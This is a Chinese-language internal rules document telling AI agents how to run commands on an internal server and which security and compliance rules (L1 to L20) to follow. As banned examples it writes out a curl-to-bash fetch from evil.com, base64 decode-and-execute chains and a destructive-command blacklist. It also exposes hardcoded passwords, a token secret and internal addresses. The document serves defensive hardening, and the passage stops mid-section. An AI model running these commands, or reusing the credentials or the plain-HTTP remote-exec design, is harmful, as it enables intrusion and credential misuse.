# 远程执行 & 简化原则 (V4 — 2026-07-14)

> **目的**: 记录 "127.0.0.1 HTTP 自己调自己" + "外网穿透 / 木马类似行为 / 密码留痕" 等过度设计与安全陷阱, 给所有 AI Agent 统一执行准则.
>
> **V2 升级 (2026-07-14 AM)**: 基于集团内网安全检查要求, 新增 4 条安全规范 (L4-L7).
>
> **V3 修订 (2026-07-14 PM)**: **核心事实修正** — `agent 无法直接 SSH 连接到 172.20.59.7**!
>
> **V4 升级 (2026-07-14 PM)**: 结合行业合规标准 (等保 2.0 / CIS Controls v8 / OWASP Top 10 / NIST CSF / SOC 2 / ISO 27001 / GDPR / PIPL), 在 V3 基础上新增 **L8-L20 共 13 个安全合规门禁领域**. 一并检查项目内已发现的合规漏洞.
> - yonaa 服务器仅内网可达 (CentOS 7.5, **无 SSH 暴露给 agent**)
> - 唯一入口是 `HTTP log_service /api/exec` + `POST /api/upload` (走 9101)
> - 上传脚本/命令走 HTTP, 不是 SSH (agent 没有 yonaa 的 SSH key)
> - 跳板方案: `agent → jumper.yyuap.com 堡垒机 → 172.20.59.7`, 但 agent 也无 ssh client token

---

## 🚨 TL;DR — 一页纸速查 (AI 必读)

### 7 大铁律

| # | 铁律 | 反例 |
|---|------|------|
| **L1** | **不要用 HTTP 协议连接 127.0.0.1** | agent 推脚本到远端, 远端再 HTTP 127.0.0.1 调自己 log_service → "自己调自己" |
| **L2** | **不用 base64 + bash -c 嵌套 (与木马行为类似)** | yonaa **无 SSH**, 上传脚本 + 跑命令必须走 `HTTP /api/upload` + `/api/exec` 明文, 禁止 base64 + bash 解码链 |
| **L3** | **任何"脚本套脚本"中间层先评估能否砍掉** | agent → 推脚本 → /tmp 写文件 → log_service → 再开 shell → 命令 — 每层都是冗余 |
| **L4** | **🆕 禁止外网穿透 (FRP / ngrok / 公网 IP / 0.0.0.0 暴露)** | server bind `0.0.0.0` 直接对外 — 内网隔离原则违反 |
| **L5** | **🆕 禁止 bash 解密 + 多层命令嵌套** | `bash -c "echo $B64 \| base64 -d \| bash"` 反向 shell 模式 — 木马行为启发式 |
| **L6** | **🆕 已开放外网的端口必做安全考虑** | 必须: token / 命令白名单 / 路径白名单 / 超时 / 输出截断 / 限流 |
| **L7** | **🆕 服务器密码不在大模型留痕 / 不备份到服务器** | 密码写死脚本 / 进程 args / 环境变量备份 — 一次性 prompt 即用即弃 |
| **L8** | **🆕 强加密与密钥管理 (CIS 3 / NIST SC-12)** | `JWT_SECRET=v2026...do-not-use-in-prod` 明文 default, AES key 写死, 静态 fallback 密钥 |
| **L9** | **🆕 密码哈希符合 OWASP 标准 (OWASP A02:2021)** | PBKDF2 100k (低于 600k 推荐) / 旧代码 SHA256 无 salt / 明文密码比对 |
| **L10** | **🆕 认证与授权分层 (OWASP A07:2021 / A01:2021)** | 单一 admin token 通杀所有接口, JWT 无 expire/refresh, 弱默认密码 admin123 |
| **L11** | **🆕 TLS / HTTPS 强制与证书校验 (CIS 4 / NIST SC-8)** | 自签证书无 trust chain, 生产 HTTP 明文传输敏感数据 |
| **L12** | **🆕 CORS / Origin / Referer 白名单 (OWASP A05:2021)** | CORS_ORIGINS=*, Access-Control-Allow-Origin 反射, CSRF token 缺失 |
| **L13** | **🆕 输入验证与 SQLi 防护 (OWASP A03:2021 / Top 10 #1)** | SQL 字符串拼, path 拼接未走规范化, eval/exec 直接调用户输入 |
| **L14** | **🆕 依赖与漏洞扫描 (CIS 6 / NIST RA-5 / OWASP A06:2021)** | requirements.txt 无版本哈希锁, 第三方库无 SCA 扫描 |
| **L15** | **🆕 日志审计与不可篡改 (等保 2.0 8.1.10 / SOC2 CC7)** | 日志未脱敏密码/token, audit log 写在应用自己盘 (可被应用篡改), 无 WORM 存储 |
| **L16** | **🆕 错误处理信息脱敏 (OWASP A09:2021)** | `flask run debug=True` 暴露 stacktrace, 错误响应含 SQL/路径信息 |
| **L17** | **🆕 速率限制与 DDoS (OWASP A04:2021 / CIS 13)** | 无单 IP 请求上限, 无端点级配额, 无慢速攻击 (Slowloris) 防护 |
| **L18** | **🆕 备份与恢复 (等保 2.0 8.1.9 / ISO 27001 A.12.3)** | 备份脚本含密码明文, 备份无 3-2-1 策略, 无定期 restore 演练 |
| **L19** | **🆕 漏洞披露 / 供应链 (NIST SC-8 / ISO 27001 A.15)** | 第三方包使用无 SBOM, CVE 出现无升级机制, 镜像来源未签名校验 |
| **L20** | **🆕 DevSecOps / CI 安全门禁 (CIS 16 / NIST SI-2)** | pre-commit 无 SAST/secrets scan, CI 无 SCA 步骤, 容器镜像无 SBOM-trivy** |

### 简化决策树

```
前提: yonaa (172.20.59.7) 无 SSH 暴露给 agent

要执行一个 shell 命令
  ├─ 在本机 → RunCommand 直跑 (✅)
  └─ 在远端 (yonaa)
      ├─ 1. 单行命令 → HTTP GET /api/exec?cmd=ls+-la+/tmp&token=... (✅ 推荐)
      ├─ 2. 复杂脚本 (≤ 100MB) → POST /api/upload?path=/tmp/x.py + /api/exec (明文!)
      ├─ 3. 重复跑同一脚本 → /api/exec bg=true 后台启
      └─ 4. ❌ 禁止: base64 / ssh -c (agent 没 ssh key + 触发明文 echo 解码启发式)
```

### 安全决策 4 问 (AI 执行前必答)

```
Q1: 这个动作是否触发"外网暴露"?     → 不能! 严禁 0.0.0.0 绑定 / FRP / ngrok
Q2: 是否包含 bash 解密 + 多层嵌套?  → 不能! 用明文 /api/upload + /api/exec
Q3: 开放的端口有 token / 白名单 / 限流吗? → 必须有!
Q4: 涉及密码?                       → 即用即弃, 不写脚本 / 不备份 / 不留痕
```

---

## 0、V3 关键事实修正 (放最前面)

> **背景**: V2 文档推荐了 SSH 直连方案 (paramiko + SSH key). **这是错的**.
>
> 真正的事实是:
>
> ```
> agent 所在机器 (外网可上 Internet, 但 SSH 没 yonaa key)
>   │
>   │ 不能直接 SSH 到 172.20.59.7!
>   ├─→ yonaa 服务器仅内网可达, **没有 SSH 暴露给 agent 主机**
>   ├─→ agent 必须走 HTTP (经由 log_service 9101)
>   └─→ 唯一可行路径: HTTP POST /api/upload (上传明文文件) + HTTP GET /api/exec (跑命令)
> ```
>
> **因此 V2 推荐的"SSH 直连"是错的**, 必须改回 HTTP. 但 HTTP 又不能 base64 (L5 触发告警).
>
> **真正方案 = HTTP + token + 明文**:
> - 上传: `POST /api/upload?path=/tmp/x.py` body=明文脚本
> - 执行: `GET /api/exec?cmd=python3+/tmp/x.py&token=...`
> - 不 base64, 不 bash -c, 不嵌套
>
> **审计重新评估 (现有代码)**:
> - `monitor_prod.py:64-69` `script_remote()` 用 base64 + /tmp/m.py + python3 — **触发告警的就是这一段**
> - 修法**不是**"改 SSH", 而**是**"改明文 (走 /api/upload)" + "明文 /api/exec"
> - 30+ 个临时脚本 `_remote_*.py` / `_verify_*.py` / `_audit_*.py` 同样改路径

---

## 一、原始案例: HTTP 127.0.0.1 自己调自己

### 1.1 现状 (2026-07-14)

```
[agent 端, 外网主机]
    │
    └── HTTP POST /api/upload?path=/tmp/x.py (multipart)  (上传脚本明文)
            │
            └─→ log_service (172.20.59.7:9101) 收到二进制, 写入 /tmp/x.py
            └─→ HTTP GET /api/exec?cmd=python3+/tmp/x.py&token=...
                    │
                    └─→ log_service shell 跑命令
                            │
                            └─→ 脚本内又去 HTTP 127.0.0.1:9101 调 log_service (❌ 自己调自己 4 层)
```

**问题**: 4 层冗余 (agent → 上传 → log_service → shell → 命令), 自己调自己, base64 + bash -c 触发安全告警.

### 1.2 正确做法 (前提: 无 SSH, 必须用 HTTP + token)

```python
import urllib.request, urllib.parse, hashlib, time

def get_token(secret='v007.35-infra'):
    h = int(time.time()) // 3600
    return hashlib.sha256(f"{secret}:{h}".encode()).hexdigest()[:16]

def exec_remote(cmd, secret='v007.35-infra'):
    token = get_token(secret)
    url = f"http://172.20.59.7:9101/api/exec?{urllib.parse.urlencode({'cmd': cmd, 'timeout': '15', 'token': token})}"
    with urllib.request.urlopen(url, timeout=30) as resp:
        import json
        return json.loads(resp.read())
```

**单行命令直接 GET**:
```bash
curl -s "http://172.20.59.7:9101/api/exec?cmd=ls+-la+/opt/app/deployments/current&token=$(python3 -c 'import hashlib,time;print(hashlib.sha256((\"v007.35-infra:\"+str(int(time.time())//3600)).encode()).hexdigest()[:16])')"
```

**复杂脚本走 /api/upload (明文 SFTP 替代, 不 base64)**:
```python
import urllib.request
with open('local_health.py', 'rb') as f:
    data = f.read()
req = urllib.request.Request(
    'http://172.20.59.7:9101/api/upload?path=/tmp/agent.py&token=XXX',
    data=data,
    method='POST',
)
req.add_header('Content-Type', 'application/octet-stream')
urllib.request.urlopen(req, timeout=60).read()
exec_remote('python3 /tmp/agent.py; rm -f /tmp/agent.py')
```

### 1.3 对比矩阵

| 维度 | 旧方案 (base64 + HTTP, 触发告警) | 新方案 (HTTP+token + 明文, 安全) |
|---|---|
| **中间层** | log_service /api/exec + base64 解码 | log_service /api/exec (明文命令) |
| **编码** | base64 (触发明文 echo + 解码启发式) | **明文** URL 编码 |
| **协议** | HTTP + 时变 token + base64 | HTTP + 时变 token, 不编码 |
| **可见性** | stderr 保留 (但混淆) | **stdout/stderr 直接看** |
| **审计** | HTTP log_service 可看 | 同上, **无变化** |
| **安全告警** | 触发"恶意脚本代码执行" | **零误报** (明文命令走白名单) |
| **前提** | yonaa 无 SSH — agent 不能 SSH 直连 | 必须用 HTTP, 但**不做 base64** |

---

## 二、4 条安全规范详解 (L4-L7)

### 2.1 L4 禁止外网穿透

**定义**: 任何让远端服务器 (`172.20.59.7`) 可被**公网直接访问**的方式都禁止.

**拦截模式**:

| 模式 | 现象 | 风险 |
|---|---|---|
| `app.run(host='0.0.0.0', ...)` | 所有网卡都监听 | 内网隔离失效 |
| `server.bind(('0.0.0.0', port))` | 同上 | 同上 |
| FRP / ngrok 域名映射 | 内外网穿透 | 数据外泄 |
| 公网 IP 直接绑定 | 暴露到外网 | 被扫描攻击 |
| 防火墙端口映射到公网 | 网关层穿透 | 同上 |

**当前 8 处 `0.0.0.0` 绑定 (2026-07-14 排查)**:

| 文件:行 | 端口 | 当前状态 | 处理建议 |
|---|---|---|---|
| `tools/log_service.py:43` | 9101 | 内网监听 (必须) | 加防火墙规则, 仅允许内网网段访问 |
| `tools/core_service.py:39` | 9200 | 内网监听 (必须) | 同上 |
| `deploy_bundle/meta/server.py:1125` | 3011 | 内网监听 (必须) | 同上 |
| `deploy_bundle/unified_server.py:234` | 8081 | **浏览器入口** (必须) | **CORS 限定内网** |
| `deploy_bundle/tools/serve_frontend.py:22` | 5003 | 验证脚本 | 仅本地测试, 默认禁用 |
| `deploy_bundle/tools/e2e_sop_drill.py:519` | - | 测试脚本 | 仅本地测试, 默认禁用 |
| `deploy_bundle/tools/mock_remote.sh:103,163` | - | mock 模拟 | 仅本地测试, 默认禁用 |
| `deploy_bundle/tools/self_test.py:205,248` | - | 自检 | 仅本地测试, 默认禁用 |

**正确做法**:
```python
# 优先 bind 到内网 IP 或 127.0.0.1
app.run(host='127.0.0.1', port=8081)
server.bind(('172.20.59.7', 8081))

# 禁止
app.run(host='0.0.0.0', port=8081)
```

**例外**: 走堡垒机 (jumper.yyuap.com) → MobaXterm SSH → 远端 shell (运维手动)

### 2.2 L5 禁止 bash 解密 + 多层命令嵌套

**触发"恶意脚本代码执行"告警的模式**:

```bash
# 模式 1: bash 解密 + 立即执行
bash -c "echo $B64 | base64 -d | bash"

# 模式 2: 写临时文件 + 立即执行
bash -c "echo $B64 | base64 -d > /tmp/x.py && python3 /tmp/x.py"

# 模式 3: 多次嵌套 shell
sh -c "bash -c \"echo $B64 | base64 -d | sh\""

# 模式 4: 反向 shell
curl https://evil.com/payload.sh | bash
```

**特征启发式 (云安全中心识别)**:
1. `bash -c` / `sh -c` 内嵌 `echo ... | base64 -d`
2. 写到 `/tmp/*.py` / `/tmp/*.sh` 后立即执行
3. `curl | sh` / `wget | bash` 这类直接管道
4. 多层嵌套 (3 层以上)

**当前 5 类触发该规则的文件**:
- `monitor_prod.py:64-69` `script_remote()` base64 + /tmp/m.py + python3 — **触发告警的就是这段**
- 多个 `_perf_check*.py` / `_verify_*.py` / `_audit_*.py` / `_exec_new_script.py`
- `docs/HANDOFF_V007_52_CORE_SERVICE.md:317` 文档示例含 base64

**正确做法 (前提: yonaa 无 SSH, agent 必须用 HTTP + 走 `/api/upload` 明文)**:

```python
# Python 端: urllib + /api/upload (明文, 不用 SFTP) + /api/exec
import urllib.request, json

# 1. POST 上传明文脚本 (不编码 body!)
with open('local_health.py', 'rb') as f:
    req = urllib.request.Request(
        'http://172.20.59.7:9101/api/upload?path=/tmp/agent.py&token=XXX',
        data=f.read(),
        method='POST',
    )
    req.add_header('Content-Type', 'application/octet-stream')
    urllib.request.urlopen(req, timeout=60).read()

# 2. GET 跑明文命令 (URL 编码, 不 base64)
url = 'http://172.20.59.7:9101/api/exec?' + urllib.parse.urlencode({
    'cmd': 'python3 /tmp/agent.py; rm -f /tmp/agent.py',
    'token': 'XXX',
})
result = json.loads(urllib.request.urlopen(url, timeout=30).read())
print(result['stdout'])
```

```bash
# curl 端: 单行命令, URL 编码
curl -s "http://172.20.59.7:9101/api/exec?cmd=ls+-la+/tmp&token=$(token)"
```

### 2.3 L6 已开放外网的端口必做安全考虑

**目前项目可经由 SSH 隧道被外网访问的端口**:

| 端口 | 服务 | 当前安全措施 | 缺口 |
|---|---|---|---|
| **9101 (log_service)** | 可观测 | 8/10 | 缺限流 + 路径遍历深度 |
| **9200 (core_service)** | 数据 CRUD | 9/10 | 验证限流 |
| **9201 (observability)** | 指标/上传 | 待核实 | 缺独立限流 |
| **9202 (ops_scheduler)** | 定时任务 | 未核实 | **优先级 P1** |
| **9203 (config_service)** | 配置 | 未核实 | **优先级 P1** |
| **9204 (dbops_service)** | DB 操作 | 未核实 | **优先级 P0** (DB 直写) |
| **9206 (health_supervisor)** | 健康监控 | 未核实 | **优先级 P1** |

**强制检查清单 (每个开放的 HTTP 服务必做 10 件事)**:
```
[ ] 1. token 时变 (SHA256(secret:hour)[:16])
[ ] 2. 多级别 token (admin / write / read 分级)
[ ] 3. 路径白名单 (ALLOWED_DIRS)
[ ] 4. 命令白名单 (EXEC_WHITELIST)
[ ] 5. 黑名单模式 (rm -rf /, dd if=, mkfs. 等)
[ ] 6. 超时 (timeout <= 60s)
[ ] 7. 输出截断 (stdout <= 50KB, stderr <= 10KB)
[ ] 8. 限流 (rate_limit, max N req/s)
[ ] 9. 请求体大小限制 (Content-Length <= 100MB)
[ ] 10. 路径遍历防护 (不能 ../ 跳出)
```

### 2.4 L7 服务器密码不在大模型留痕

**禁止模式**:
```python
# 写死
PASSWORD = "Admin@2026!Init"
# env
ENV_PASSWORD = os.environ.get("SERVER_PASSWORD")
# 命令行 (ps aux 可见)
subprocess.Popen(["sshpass", "-p", "Admin@2026!Init", "ssh", ...])
# 服务器内部备份
echo "SERVER_PASSWORD=xxx" >> /opt/app/.env
```

**正确模式**:
```python
# getpass 一次性输入, 用完即弃
import getpass
pwd = getpass.getpass("Enter server password: ")
ssh.connect(host, password=pwd)
del pwd  # 显式删除

# SSH key (最推荐) - 但前提是有 SSH, 现在没有
ssh.connect(host, key_filename='/root/.ssh/id_rsa')

# vault / 1Password CLI (企业级)
# op read 'op://Vault/ssh-server/password' | ...
```

**当前文档脱敏清单**:
- `docs/DEPLOY-CHEATSHEET-*.txt:170` 含 `Admin@2026!Init` **必须脱敏**: `admin / <PASSWORD from vault>`
- `tools/reset_admin_password.sh:58,169` 写死 — 仅 admin 一次性重置用

---

## 三、统一执行规范 (推荐) — yonaa 无 SSH, 必须走 HTTP

### 3.1 远程命令 (HTTP GET /api/exec)

```python
import urllib.request, urllib.parse, hashlib, time, json

def get_token(secret='v007.35-infra'):
    h = int(time.time()) // 3600
    return hashlib.sha256(f"{secret}:{h}".encode()).hexdigest()[:16]

def http_exec(cmd, secret='v007.35-infra', timeout=30):
    token = get_token(secret)
    url = 'http://172.20.59.7:9101/api/exec?' + urllib.parse.urlencode({
        'cmd': cmd, 'timeout': str(timeout), 'token': token,
    })
    with urllib.request.urlopen(url, timeout=timeout+5) as resp:
        return json.loads(resp.read())

result = http_exec('ls -la /opt/app/deployments/current')
print(result['stdout'])
```

### 3.2 远程脚本 (HTTP POST /api/upload + /api/exec)

```python
import urllib.request, json

def http_upload(local_path, remote_path, secret='v007.35-infra', token=None):
    token = token or get_token(secret)
    with open(local_path, 'rb') as f:
        data = f.read()
    req = urllib.request.Request(
        f'http://172.20.59.7:9101/api/upload?path={remote_path}&token={token}',
        data=data,
        method='POST',
    )
    req.add_header('Content-Type', 'application/octet-stream')
    with urllib.request.urlopen(req, timeout=60) as resp:
        return json.loads(resp.read())

def http_script(local_path, remote_path='/tmp/agent.py', secret='v007.35-infra'):
    http_upload(local_path, remote_path, secret=secret)
    result = http_exec(f'python3 {remote_path}; rm -f {remote_path}', secret=secret)
    return result['stdout'], result['stderr']

out, err = http_script('./my_health_check.py')
print(out)
```

### 3.3 本机直跑

```python
# AI Agent 本机直接执行, 无需远程
RunCommand(command="ls -la /opt/app/deployments/current")
```

### 3.4 禁止模式

```python
# 禁止 1: HTTP 调自己 (自己调自己, log_service 在同台)
cmd = "curl http://127.0.0.1:9101/api/exec?cmd=xxx&token=xxx"

# 禁止 2: bash 解密嵌套 (yonaa 上脚本不能这么写)
code = 'bash -c "echo $B64 | base64 -d > /tmp/x.py && python3 /tmp/x.py"'

# 禁止 3: bash 解码 + 管道 (反向 shell 模式)
code = 'echo $B64 | base64 -d | bash'

# 禁止 4: agent 调 SSH 客户端 (yonaa 不在 agent 可达 ssh 列表)
subprocess.run(['ssh', 'root@172.20.59.7', 'ls'])  # 不通!

# 禁止 5: 0.0.0.0 监听 (暴露到外网)
app.run(host='0.0.0.0', port=8081)  # 必须改 127.0.0.1 或内网 IP

# 禁止 6: 密码写死脚本
PASSWORD = "Admin@2026!Init"

# 禁止 7: 密码留痕到环境变量/配置
os.environ["SERVER_PASSWORD"] = "Admin@2026"
```

**最大反向提示**: 如果你想 `ssh root@172.20.59.7 ...` 或 `scp ... root@172.20.59.7:/tmp/...` — **这条路不存在** (yonaa 无 SSH 给 agent). 必须用 HTTP. 但用 HTTP 时**不**走 base64, 走明文 URL 编码. 这是 V3 的核心要点.

---

## 四、与现有规则的关系

### 4.1 SESSION_REMINDER.md 升级建议

```markdown
## [!!!] 铁律 29 (V3): 远程执行 + 安全 7 大铁律 [!!!]

> **AI Agent 必须遵守**:
> - L1 禁止 HTTP 127.0.0.1 自己调自己
> - L2 禁止 base64 + bash -c (yonaa 无 SSH, 必须 HTTP 明文)
> - L3 禁止"脚本套脚本"中间层
> - L4 禁止外网穿透
> - L5 禁止 bash 解密 + 多层嵌套 (木马行为)
> - L6 已开放外网的端口必做安全考虑 (token/白名单/限流/超时/截断)
> - L7 服务器密码一次性使用, 不留痕, 不备份到服务器
>
> 详见: `.trae/rules/remote-execution-simplicity.md` (V3)
```

### 4.2 monitor_prod.py 重构 (PR 待提交)

```python
# 重构方向 (保留 HTTP, 改明文):
# - 删除 exec_remote() 的 script_remote() 用法
# - 改用 http_upload() + http_exec() (走 /api/upload + /api/exec 明文)
# - 不再写 base64 + /tmp/m.py
# - 保留 log_service 查询端点 (/api/log?file=, /api/system)
```

---

## 五、迁移路径

### Phase 1: 立即 (本周, P0)

- [ ] **修 `/api/exec` (9101)**: 加 rate_limit + 路径遍历深度验证
- [ ] **删临时脚本**: `_perf_check*.py` / `_verify_*.py` / `_audit_*.py` / `_full_check*.py` / `_final_verify.py` / `_exec_new_script.py` 全部 base64 + bash 临时脚本模式
- [ ] **改 `monitor_prod.py`**: 删 `script_remote()` base64, 改明文 `http_upload()` + `http_exec()`
- [ ] **核实 9202/9203/9204/9206 端口的 token + 限流是否到位**
- [ ] **文档脱敏**: DEPLOY-CHEATSHEET-*.txt 含 `Admin@2026!Init` → 改成 `<PASSWORD from vault>`

### Phase 2: 本月 (P1)

- [ ] **0.0.0.0 全面审计**: 所有 `app.run` / `server.bind` 加注释说明 (内网/外网/测试)
- [ ] **9202/9203/9204 加 token + 限流**
- [ ] **统一密码输入**: 所有 `monitor_*` / `remote_*` 脚本改 `getpass()`

### Phase 3: 季度 (P2)

- [ ] **SSH key 替代密码**: 远端服务器部署 SSH 公钥 (运维手动)
- [ ] **Vault 集成**: 1Password / HashiCorp Vault
- [ ] **`/api/exec` 评审下线**: 评估是否完全去除 (保留查询/上传)

---



---

## 七、V4 — 13 个行业合规门禁详解 (L8-L20)

> **合规地图** — 每个 Lx 标注对应的行业标准映射, 用于合规审计对标:
>
> | 标准 | 对应章节 | 强相关 Lx |
> |---|---|---|
> | **GB/T 22239-2019 (等保 2.0)** | 8.1.4 密码应用 / 8.1.5 访问控制 / 8.1.9 备份 / 8.1.10 监测 | L8 L9 L10 L15 L18 |
> | **CIS Controls v8** | 3 数据保护 / 4 安全管理 / 6 访问控制 / 13 网络监测 / 16 应用安全 | L8 L11 L14 L15 L17 L20 |
> | **OWASP Top 10 2021** | A01 访问控制 / A02 加密失败 / A03 注入 / A04 不安全设计 / A05 配置错误 / A06 漏洞组件 / A07 认证失败 / A09 日志失败 | L9 L10 L11 L12 L13 L14 L15 L16 L17 |
> | **NIST CSF 1.1** | PR.DS 数据安全 / PR.AC 访问控制 / PR.IP 保护 / DE.CM 监测 / RS.MI 缓解 | L8 L10 L15 L19 L20 |
> | **NIST SP 800-53** | SC-12 密钥管理 / SC-8 通信保护 / SI-2 漏洞修复 / AC-2 账户管理 | L8 L11 L14 L19 |
> | **SOC 2 (TSC)** | CC6 访问 / CC7 系统操作 / CC8 变更 / CC9 风险 | L10 L15 L20 |
> | **ISO 27001:2022** | A.8 资产 / A.10 密码 / A.12.3 备份 / A.14 安全开发 / A.15 供应链 | L8 L9 L18 L19 L20 |
> | **GDPR / PIPL** | Art.32 / 51 条 数据安全 | L8 L15 |

### 7.1 L8 强加密与密钥管理

**对应标准**: CIS 3 / NIST SC-12 / ISO 27001 A.10

**❌ 当前 yonaa 项目漏洞** (`deploy_bundle/tools/deploy_step.sh:27`):
```bash
# P0 漏洞: 明文 default 密钥, 如果环境未注入, 就用这个
JWT_SECRET="${JWT_SECRET:-v20260702-deploy-key-2026-07-03-do-not-use-in-prod}"
# 应该:
JWT_SECRET="${JWT_SECRET:?ERROR: JWT_SECRET must be set by deploy.sh, see deploy.sh:152}"
```

**判定标准**:
```
[ ] 1. JWT_SECRET / FLASK_SECRET / CORS_ALLOWED 等强密钥必须 >= 32 字节随机生成
[ ] 2. 不允许任何 default fallback (${VAR:-default} 形式必须改成 ${VAR:?error})
[ ] 3. AES key 走 KMS 或环境变量, 不写代码
[ ] 4. 密钥 rotate 周期 <= 90 天
[ ] 5. 密钥不留磁盘 / git / 日志 / backup
```

**修复**:
```bash
# deploy.sh 中
JWT_SECRET=$(python3 -c "import secrets; print(secrets.token_urlsafe(48))")
echo "$JWT_SECRET" > /etc/yonaa/jwt_secret
chmod 600 /etc/yonaa/jwt_secret
echo "JWT_SECRET=file:///etc/yonaa/jwt_secret" >> /etc/yonaa/secrets.env
```

### 7.2 L9 密码哈希符合 OWASP 标准

**对应标准**: OWASP A02:2021 / NIST SP 800-63B / ISO 27001 A.10

**❌ 当前 yonaa 项目漏洞** (`deploy_bundle/meta/services/auth_provider.py:22-50`):
```python
def _hash_password_pbdkdf2(password, salt=None, iterations=100000):
    # P0: 100k iterations < OWASP 推荐 600k (2023+)
    # P0: hashlib.pbkdf2_hmac('sha256', ...) 缺 PBKDF2-HMAC-SHA512
    hashlib.pbkdf2_hmac('sha256', ...)

def _verify_password(...):
    if password_hash.startswith("PBKDF2$"):
        # 兼容分支
    else:
        # P0 红线: legacy_hash 用 SHA256 无 salt!
        legacy_hash = hashlib.sha256(password.encode('utf-8')).hexdigest()
        return secrets.compare_digest(legacy_hash, password_hash)
        # 攻击者直接读 db 就能拿到 admin 密码哈希, 彩虹表秒破
```

**判定标准** (OWASP Password Storage Cheat Sheet 2023):
```
[ ] 1. 算法: Argon2id (首选) / bcrypt (cost>=12) / scrypt / PBKDF2-HMAC-SHA512 (iter>=600000)
[ ] 2. 每个密码独立 salt (>=16 bytes)
[ ] 3. 禁止 SHA1/MD5/SHA256 (无 salt) 用于密码
[ ] 4. 必须 timing-safe 比较 (secrets.compare_digest / hmac.compare_digest)
[ ] 5. 旧 hash 升级策略: 首次登录成功时 rehash
```

**修复**:
```python
# 使用 argon2-cffi (推荐)
from argon2 import PasswordHasher
ph = PasswordHasher(
    time_cost=3,        # 基准 0.5s
    memory_cost=65536,   # 64MB
    parallelism=4,
    hash_len=32,
    salt_len=16,
)

def hash_password(password: str) -> str:
    return ph.hash(password)

def verify_password(password: str, hash_str: str) -> bool:
    try:
        ph.verify(hash_str, password)
        return True
    except (VerifyMismatchError, VerificationError, InvalidHashError):
        return False

# rehash 检查
def verify_and_rehash(password, hash_str):
    if verify_password(password, hash_str):
        if ph.check_needs_rehash(hash_str):
            return True, hash_password(password)  # 返回新 hash
        return True, hash_str
    return False, None
```

### 7.3 L10 认证与授权分层

**对应标准**: OWASP A07:2021 / A01:2021 / NIST AC-2 / SOC 2 CC6

**❌ 当前 yonaa 项目漏洞**:
1. `core_service.py:96` — `tokens.add(hashlib.sha256(...secret:hour)...)` 单 token 通杀所有端点
2. `tools/remote_monitor.ps1:14` — `[string]$AdminPass = "admin123"` 弱默认密码
3. `tools/deploy.sh:567` — `DeployTest@2026!` 硬编码
4. `tools/e2e_sop_drill.py:473` — `{"password": "admin123"}` 测试用户硬编码
5. `deploy_bundle/deploy.sh:660` — `admin/admin123` 硬编码 fallback

**判定标准**:
```
[ ] 1. 多级 token (admin / write / read)
[ ] 2. JWT 含 expire (15min) + refresh token (7 days)
[ ] 3. 强制密码策略: >=12 字符, 大小写+数字+符号
[ ] 4. 默认 admin 密码首次登录强制修改
[ ] 5. 失败锁定: 5 次错误 → 15min 锁定 + 告警
[ ] 6. 账号审计: 90 天未用 → 自动禁用
[ ] 7. RBAC / 最小权限
```

### 7.4 L11 TLS / HTTPS 强制与证书校验

**对应标准**: CIS 4 / NIST SC-8 / OWASP A02:2021

**当前状态**: yonaa 使用自签证书 + HTTP 明文 (8081/9101/9200 等)
```
[ ] 1. 生产必须 TLS 1.2+, 禁用 TLS 1.0/1.1
[ ] 2. 强 cipher suites (AES-GCM / ChaCha20)
[ ] 3. HSTS header (Strict-Transport-Security: max-age=31536000)
[ ] 4. 内部 RPC (8081→3011) 应启用 mTLS (双向证书)
[ ] 5. 证书 expire ≤ 30 天提前告警
[ ] 6. 禁止自签证书放生产 (需内网 PKI 签发)
```

### 7.5 L12 CORS / Origin 白名单

**对应标准**: OWASP A05:2021 / CIS 6

**当前代码** (`deploy_bundle/tools/test_diagnose.py:186`):
```python
env={**os.environ, "CORS_ALLOWED_ORIGINS": "*"}  # 测试环境 OK, 生产禁止 *
```

**判定标准**:
```
[ ] 1. CORS_ALLOWED_ORIGINS 必须白名单, 禁止 *
[ ] 2. Access-Control-Allow-Origin 禁止反射 Origin (要 fixed allow)
[ ] 3. Credentials 模式必须有明确 Origin 而非 "*"
[ ] 4. CSRF token (Double Submit Cookie 或 Synchronizer Token)
[ ] 5. SameSite=Strict Cookie
[ ] 6. Referer 检查 (重要操作: 转账/删除)
```

### 7.6 L13 输入验证与 SQLi 防护

**对应标准**: OWASP A03:2021 (注入 #1) / CIS 16

**当前代码** (`deploy_bundle/meta/core/sql_adapters.py:1137`):
```python
logger.error("pymysql not installed. Run: pip install pymysql")  # 仅日志
# 实际 SQL 执行需要审视: 必须全部用 ?, 不允许 %s string format
```

**判定标准**:
```
[ ] 1. SQL 全部 ?/named-param 占位符
[ ] 2. Path 走 .resolve() 防 ../ 跳出
[ ] 3. Shell exec 走白名单命令
[ ] 4. JSON / XML schema 严格校验
[ ] 5. 文件上传: mime 白名单 + 大小限制 + filename 清洗
[ ] 6. SSRF 防护: 调 URL 时禁用 file://, 限内网 IP (10/8, 172.16/12, 192.168/16)
```

### 7.7 L14 依赖与漏洞扫描 (SCA)

**对应标准**: CIS 6 / NIST RA-5 / OWASP A06:2021 (漏洞组件 #3) / ISO 27001 A.15

**当前项目**: `meta/requirements.txt` 存在但**无 SCA 扫描步骤**
```
[ ] 1. pip-audit 在 CI 中扫描 (每 PR)
[ ] 2. safety / Snyk / Trivy 集成
[ ] 3. Lockfile (pip-tools / uv) 锁定精确版本
[ ] 4. CVE 出现到修复 SLA: 高危 7 天 / 中危 30 天 / 低危 90 天
[ ] 5. SBOM (Software Bill of Materials) 生成 + 归档
```

**修复**: 在 deploy.sh 加:
```bash
# CI 步骤
pip install pip-audit
pip-audit -r meta/requirements.txt --strict
# SBOM 生成
pip install cyclonedx-bom
cyclonedx-py environment -o sbom.json
```

### 7.8 L15 日志审计与不可篡改

**对应标准**: 等保 2.0 8.1.10 / SOC 2 CC7 / GDPR Art.30

**当前代码问题**:
- 日志文件写在应用自己目录 (`/opt/app/deployments/current/logs/`), 应用可篡改
- 日志未脱敏, 易泄露 password / token / session

```
[ ] 1. 日志脱敏: 自动 mask password/apiKey/bearer/cookie/Authorization
[ ] 2. 集中式日志: rsyslog → 独立审计服务器
[ ] 3. WORM 存储 (write once read many) 防篡改
[ ] 4. 90 天留存 (业务日志) + 1 年留存 (审计日志)
[ ] 5. 关键操作 (登录/权限/数据删除) 加 timestamp + user_id + ip
[ ] 6. 日志加密 (at-rest encryption)
```

### 7.9 L16 错误处理信息脱敏

**对应标准**: OWASP A09:2021 / CIS 16

**当前代码风险** (`deploy_bundle/lib/common.sh:30`):
```bash
# set -e  # 注释掉了!
# 应该 set -euo pipefail (严格模式)
```

**判定标准**:
```
